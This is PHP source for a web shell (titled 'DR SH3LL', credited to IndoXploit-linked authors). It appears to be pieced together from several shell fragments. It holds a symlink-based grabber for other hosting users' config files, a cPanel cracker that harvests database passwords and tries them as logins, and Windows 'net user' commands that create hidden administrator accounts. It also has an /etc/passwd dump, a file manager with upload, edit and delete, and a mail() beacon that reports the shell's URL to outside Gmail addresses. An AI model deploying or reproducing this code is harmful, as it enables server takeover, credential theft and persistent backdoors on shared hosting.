"/home/$user_kuontol/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_kuontol/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_kuontol/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_kuontol/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_kuontol/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_kuontol/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_kuontol/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_kuontol/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
	if($_POST['config'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("kuontol_configgrab/$user_kuontol-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"kuontol_Symconfig/".$user_kuontol."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"kuontol_sym404/".$user_kuontol."-".$nama_config.".txt");
if($sym404){
	@mkdir("kuontol_sym404/".$user_kuontol."-".$nama_config.".txt404", 0777);
	$htaccess="Options Indexes FollowSymLinks
DirectoryIndex kuontol.htm
HeaderName kuontol.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";

@file_put_contents("kuontol_sym404/".$user_kuontol."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"kuontol_sym404/".$user_kuontol."-".$nama_config.".txt404/kuontol.txt");

	}

}

                    }     
		}  if($_POST['config'] == 'grab') {
            echo "<center><a href='kuontol_configgrab'><font color=lime>Done</font></a></center>";
		}
    if($_POST['config'] == '404') {
        echo "<center>
<a href=\"kuontol_sym404/root/\">SymlinkNya</a>
<br><a href=\"kuontol_sym404/\">Configurations</a></center>";
    }
     if($_POST['config'] == 'symlink') {
echo "<center>
<a href=\"kuontol_symconfig/root/\">Symlinknya</a>
<br><a href=\"kuontol_symconfig/\">Configurations</a></center>";
			}if($_POST['config'] == 'symvhost') {
echo "<center>
<a href=\"kuontol_symvhost/root/\">Root Server</a>
<br><a href=\"kuontol_symvhost/\">Configurations</a></center>";
			}
		
		
		}else{
        echo "<form method=\"post\" action=\"\"><center>
		</center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo include("/etc/passwd"); 
        echo "</textarea><br><br>
        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"grab\">Config Grab</option>
        <option value=\"symlink\">Symlink Config</option>
		<option value=\"404\">Config 404</option>
		<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
}
}
if($_GET['do'] == 'tolls') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "USA | CPANEL | FRESH AND VALID 100% | http://$dom:2082 | $ucp | $pcp | 6.00<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>IndoXploit.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($asui) {
			$pass = "";
			$dira = scandir($asui);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($asui);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
}
if($_GET['do'] == 'RDP') {
echo '<p>-| Create RDP  |-</p>
<form action="" method="post">User :<input type="text" name="username" required> Pass :<input type="text" name="password" required> <input type="hidden" name="kshell" value="1"><input type="submit" name="submit" value=">>">
</form>
</div>

<center>
<div id="content-center">
<p>-{ Option }-</p>
<form action="" method="post"><input type="text" name="rusername" placeholder="Masukan Username"> <select name="aksi">
						<option value="1">Tampilkan Username</option>
						<option value="2">Hapus Username</option>
						<option value="3">Ubah Password</option>
				</select>
<input type="hidden" name="kshell" value="2">
<input type="submit" name="submit" value=">>"></form>
</div>';
}
if($_POST['submit']){
echo "<p>---------------{ INFO }---------------</p>";	
if($_POST['kshell']=="1"){
	$r_user = $_POST['username'];
	$r_pass = $_POST['password'];
	$cmd_cek_user   = shell_exec("net user"); 
	if(preg_match("/$r_user/", $cmd_cek_user)){
		echo $gaya_root.$r_user." sudah ada".$o;
	}else {
	$cmd_add_user   = shell_exec("net user ".$r_user." ".$r_pass." /add");
    $cmd_add_groups1 = shell_exec("net localgroup Administrators ".$r_user." /add");
    $cmd_add_groups2 = shell_exec("net localgroup Administrator ".$r_user." /add");
    $cmd_add_groups3 = shell_exec("net localgroup Administrateur ".$r_user." /add");
        
    	if($cmd_add_user){
    		echo $gaya_root."<p>[add user]-> ".$r_user." <font color='greenyellow'>Berhasil</font><p>".$o;
    	}else {
    		echo $gaya_root."<p>[add user]-> ".$r_user." <font color='red'>Gagal</font><p>".$o;
    	}
    	if($cmd_add_groups1){
              echo $gaya_root."<p>[add localgroup Administrators]-> ".$r_user." <font color='greenyellow'>Berhasil</font><p>".$o;
    	}else
    	if($cmd_add_groups2){
              echo $gaya_root."<p>[add localgroup Administrator]-> ".$r_user." <font color='greenyellow'>Berhasil</font><p>".$o;
    	}else
    	if($cmd_add_groups3){
              echo $gaya_root."<p>[add localgroup Administrateur]-> ".$r_user." <font color='greenyellow'>Berhasil</font><p>".$o;
    	}else {
    		  echo $gaya_root."<p>[add localgroup]-> ".$r_user." <font color='red'>Gagal - Contact Shor7sec</font><p>".$o;
    	}
			  echo $gaya_root."<p>[INFO PC]-> RDP IP ".$_SERVER["HTTP_HOST"]." Username : ".$r_user." Password : ".$r_pass." <font color='greenyellow'>Berhasil</font><p>".$o;

	}



}else if($_POST['kshell']=="2"){

if($_POST['aksi']=="1"){
 echo "<pre>".shell_exec("net user");
}
else if($_POST['aksi']=="2"){
$username = $_POST['rusername'];
$cmd_cek_user   = shell_exec("net user");
	if (!empty($username)){
		if(preg_match("/$username/", $cmd_cek_user)){
		$cmd_add_user   = shell_exec("net user ".$username." /DELETE");
		if($cmd_add_user){ 
			echo $gaya_root."<p>[remove user]-> ".$username." <font color='greenyellow'>Berhasil</font><p>".$o;
		}else {
			echo $gaya_root."<p>[remove user]-> ".$username." <font color='red'>gagal</font><p>".$o;
		}
	}else {
		echo $gaya_root."<p>[remove user]-> ".$username." <font color='red'>Tidak ditemukan</font><p>".$o;
	}
	}else {
		echo $gaya_root."<p>[PESAN]-> <font color='red'>Kamu lupa masukin Username yang akan di delete</font><p>".$o;
	}
}else if($_POST['aksi']=="3"){
$username = $_POST['rusername'];
$password = "jancok";
$cmd_cek_user   = shell_exec("net user");
	if (!empty($username)){
		if(preg_match("/$username/", $cmd_cek_user)){
			$cmd_add_user   = shell_exec("net user ".$username." jancok");
			if($cmd_add_user){
			echo $gaya_root."<p>[change password]-> (".$username."|".$password.") <font color='greenyellow'>Berhasil</font><p>".$o;
		}else {
			echo $gaya_root."<p>[change password]-> (".$username."|".$password.") <font color='red'>GAGAL</font><p>".$o;
		}
	}else
{
	echo $gaya_root."<p>[PESAN]-> <font color='red'>Username Tidak Ditemukan di server</font><p>".$o;
}
}else
{
	echo $gaya_root."<p>[PESAN]-> <font color='red'>Kamu lupa masukin Username yang akan di delete</font><p>".$o;
}
		
}

}

}
?>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'snopunks@gmail.com,malaysia.sender@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "IDBTE4M PLUGINS INSTALL", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<?php 


		
@ini_set('log_errors',0);
@ini_set('output_buffering',0);
set_time_limit(0);
error_reporting(0);
if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
echo '<html><head>
<title>-_-</title>
<meta http-equiv="Content-Type" content="jpg/png; charset=utf-8"><div class="gmail_extra"><br>
<link rel="SHORTCUT ICON" href="http://goenk.wapgem.com/idb.png">
<body>
<style type="text/css">
	body {
    background: black;
    color: #00FF00;
    font-family: monospace;
}

.accessGranted {
    position: absolute;
    top: 200px;
    background: #333;
    padding: 20px;
    border: 1px solid #999;
    width: 300px;
    left: 50%;
    margin-left: -150px;
    text-align: center;
}

.accessDenied {
    position: absolute;
    top: 200px;
    color: #F00;
    background: #511;
    padding: 20px;
    border: 1px solid #F00;
    width: 300px;
    left: 50%;
    margin-left: -150px;
    text-align: center;
}
#content-center {
    width: 400px;
    padding: 0px 10px 10px 10px;
    width: 800px; 
    margin: 0 auto;
}
#content-left {
margin: 0 auto;
     text-align: left;
}
#content-right {
margin: 0 auto;
     text-align: right;
}
input,select,textarea{
    border:0;
    border:1px solid #900;
    background:black;
    margin:0;
        color: white;

    padding:2px 4px;
}
input:hover,textarea:hover,select:hover{
    background:black;
        color: blue;

    border:1px solid #f00;
}
                        a{ text-decoration:none; color:red;}
</style>
</head>
<H1><center>-=[+] DR SH3LL [+]=-</center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
';
echo '<font color="aqua"><center>'.php_uname().'</center></font><br>Dev By ./IzunaWeb<br>';
echo '<tr><td>
<center>
<div id="content-center">
<form method="post">
<input type="text" name="cmd" size="30"><input type="submit" value="Command">
</form>
<br>
+ [ <a href="?"><font color="aqua">Home</font></a> ]-[ <a href="?do=wpm"><font color="aqua">Wp Mass</font></a> ]-[ <a href="?do=jumping"><font color="aqua">Jumping</font></a> ]-[ <a href="?do=mass_deface"><font color="aqua">Mass Deface</font></a> ]-[ <a href="?do=RDP"><font color="aqua">KRDP</font></a> ]-[ <a href="?do=config"><font color="aqua">Config Grab</font></a> ]-[ <a href="?do=config2"><font color="aqua">Grab v2</font></a> ]-[ <a href="?do=tolls"><font color="aqua">Cp Krek</font></a> ] +

<br><br>';
echo 'SH3LL #>';
if(isset($_GET['path'])){
    $path = $_GET['path'];   
}else{
    $path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">OK COK SUKSESS !!</font><br />';
    }else{
        echo '<font color="red">ASU RAIMU ELK :P</font><br />';
    }
}
echo '<center>
<form enctype="multipart/form-data" method="POST">
<input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Change Name Done.</font><br />';
            }else{
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Edit File Done.</font><br />';
            }else{
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Delete Dir Done.</font><br />';
            }else{
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?path=$path/$dir\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="aqua">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="aqua">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '
</BODY>
</HTML>';
function perms($file){
    $perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>
